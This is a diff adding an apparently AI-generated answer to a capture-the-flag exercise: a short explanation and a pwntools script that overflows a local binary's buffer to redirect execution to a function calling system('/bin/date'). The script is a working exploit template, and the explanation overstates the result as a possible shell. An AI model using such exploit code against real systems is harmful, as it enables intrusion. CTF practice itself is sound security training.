@@ -1,0 +1,32 @@
+code(prefix='To solve this CTF challenge using `pwntools`, we need to exploit the buffer overflow vulnerability in the `vulnerable_function` function. The goal is to overwrite the return address on the stack with the address of the `not_called` function, which calls `system("/bin/date")`. This will allow us to execute the `system` call and potentially gain a shell or execute arbitrary commands.
+
+Steps:
+1. Identify the offset to the return address.
+2. Find the address of the `not_called` function.
+3. Craft the payload to overwrite the return address with the address of `not_called`.
+4. Send the payload to the vulnerable function.', imports='from pwn import *', code="# Start a process or connect to a remote service
+binary_path = './vulnerable_binary'
+
+# Context settings
+context.binary = binary_path
+context.arch = 'i386'
+context.os = 'linux'
+
+# Start the process
+io = process(binary_path)
+
+# Find the offset to the return address
+offset = cyclic_find(0x61616161)  # Replace 0x61616161 with the pattern found in the crash
+
+# Find the address of the not_called function
+not_called_addr = p32(0x080484A4)  # Replace with the actual address of not_called
+
+# Craft the payload
+payload = b'A' * offset
+payload += not_called_addr
+
+# Send the payload
+io.sendline(payload)
+
+# Interact with the process
+io.interactive()")
